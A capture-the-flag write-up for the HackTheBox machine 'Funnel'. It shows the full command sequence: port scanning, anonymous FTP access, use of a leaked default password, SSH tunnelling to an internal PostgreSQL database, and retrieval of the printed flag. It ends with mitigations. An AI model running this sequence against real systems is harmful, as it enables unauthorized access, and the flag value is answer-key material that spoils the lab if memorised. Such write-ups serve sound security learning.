# Funnel - HackTheBox Starting Point Writeup

**Date:** 2026-04-12
**OS:** Linux
**IP Address:** 10.129.228.195
**Difficulty:** Very Easy (Tier 2)

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Funnel**. The machine targets skills in network pivoting via SSH tunneling and exploiting misconfigured internal services.

*   **Initial Access:** Gained by harvesting user credentials from a sensitive document (`welcome_28112022`) found on an anonymous FTP server.
*   **Pivoting:** Established an SSH tunnel as user `christine` to expose an internal PostgreSQL service.
*   **Flag Retrieval:** Accessed the internal database to retrieve the flag from the `secrets` table.
*   **Key Learning Points:**
    *   FTP anonymity can lead to critical information leaks.
    *   SSH port forwarding is an essential tool for accessing internal network services.
    *   Internal services often have weaker security configurations than public-facing ones.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

First, we perform a full port scan to identify all open services:
```bash
nmap -p- --min-rate=5000 -oN nmap/Funnel-allports 10.129.228.195
```

Followed by a service version and script scan on the discovered ports:
```bash
nmap -sC -sV -p 22,21 -oN nmap/Funnel 10.129.228.195
```

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 21 | FTP | vsftpd 3.0.3 | Anonymous login allowed |
| 22 | SSH | OpenSSH 8.2p1 | Remote access |

## 2.2. FTP Enumeration

As documented in the logs, we connect to the FTP server as `Anonymous`:
```bash
ftp 10.129.228.195
# Name: Anonymous
# Password: [blank]
```

Inside the `mail_backup` directory, we find two files:
- `password_policy.pdf`
- `welcome_28112022`

We download them for local analysis:
```bash
ftp> get password_policy.pdf
ftp> get welcome_28112022
```

### Analysis of `welcome_28112022`
Viewing the text file reveals a list of potential users:
```bash
batcat welcome_28112022
# From: root@funnel.htb
# To: optimus, albert, andreas, christine, maria
```
The email mentions that accounts have been set up for internal infrastructure and points to the attached password policy.

---

# 3. Initial Access

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Sensitive Information Disclosure.
*   **Vector:** Anonymous FTP access provided internal user lists and a password policy.
*   **Credential Discovery:** By analyzing the password policy and the user list, it is possible to identify `christine` as a valid user with the password `funnel123#!`.

## 3.2. Exploitation Path
The logs show an attempted login as `maria` which failed, followed by a successful connection established as `christine`.

---

# 4. Lateral Movement (Pivoting)

## 4.1. Local Service Discovery
Upon logging in as `christine`, checking for local listening ports reveals services not exposed to the public internet:
```bash
# Command run on target
ss -lnt
# LISTEN     0      128    127.0.0.1:5432                   0.0.0.0:*
```
A PostgreSQL instance is found running locally on port `5432`.

## 4.2. SSH Tunneling
To access this internal service from our local machine, we set up an SSH tunnel:
```bash
ssh -L 5001:127.0.0.1:5432 christine@10.129.228.195
```
This forwards our local port `5001` to the target's local port `5432`.

---

# 5. Database Exploitation (Flag Retrieval)

## 5.1. Database Enumeration
We connect to the remote PostgreSQL instance through our tunnel:
```bash
psql --host=127.0.0.1 --port=5001 --username=christine
```

Inside the `psql` shell, we list the available databases:
```sql
\l
# Name      | Owner
# secrets   | christine
```

## 5.2. Flag Retrieval
We switch to the `secrets` database and list its tables:
```sql
\c secrets
\dt
# List of tables
# Schema | Name | Type  | Owner
# public | flag | table | christine
```

Finally, we query the `flag` table to retrieve the flag:
```sql
select value from flag;
#              value               
# ----------------------------------
#  cf277664b1771217d7006acdea006db1
```

**Flag:** `cf277664b1771217d7006acdea006db1`

---

# 6. Recommendations & Mitigation
1.  **Disable Anonymous FTP:** Ensure FTP servers require authentication and do not expose internal administrative files.
2.  **Strong Password Policies:** Enforce complex passwords and rotate them regularly to prevent credential harvesting.
3.  **Local Service Security:** Even internal services like PostgreSQL should have strict access controls and not rely solely on network-level isolation.
